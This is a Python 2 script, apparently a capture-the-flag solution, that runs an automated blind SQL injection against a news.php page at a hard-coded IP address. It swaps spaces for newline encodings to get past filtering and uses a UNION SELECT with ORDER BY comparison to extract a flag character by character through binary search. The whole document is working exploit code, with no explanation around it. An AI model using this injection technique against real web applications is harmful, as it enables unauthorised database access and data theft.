#coding:utf-8

import requests
url = "http://118.190.134.8/t1/news.php?id=4%0aUNION%0aall%0aSELECT%0a*%0aFROM%0a((SELECT%0a1)a%0aJOIN%0a(SELECT%0a2)b%0aJOIN%0a(SELECT%0a0x33)c%0aJOIN%0a(SELECT%0a0x{0})d)%0aorder%0aby%0a4%0adesc"
# url2 = ")d)%0aorder%0aby%0a4%0adesc"
txt = requests.get("http://118.190.134.8/t1/news.php?id=4%0aUNION%0aall%0aSELECT%0a*%0aFROM%0a((SELECT%0a1)a%0aJOIN%0a(SELECT%0a2)b%0aJOIN%0a(SELECT%0a0x33)c%0aJOIN%0a(SELECT%0a0x67)d)%0aorder%0aby%0a4%0adesc").content
flag = ""

# -.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}~
sqllist = ["2D","2E","30","31","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","4A","4B","4C","4D","4E","4F","50","51","52","53","54","55","56","57","58","59","5A","61","62","63","64","65","66","67","68","69","6A","6B","6C","6D","6E","6F","70","71","72","73","74","75","76","77","78","79","7A","7B","7D","7E"]

old_char = ""
for x in range(62):
	for y in range(len(sqllist)):
		l = 0
		r = len(sqllist)
		while l<r:
			mid = (l+r)/2
			payload = old_char + sqllist[mid]
			target = url.format(payload)
			attack = requests.get(target).content
			#print target.replace('%0a',' ')
			if attack == txt:
				r = mid 
			else:
				l = mid+1
		flag += sqllist[l-1].decode('hex')
		old_char += sqllist[l-1]
		break 
	print flag
print "ok"
			

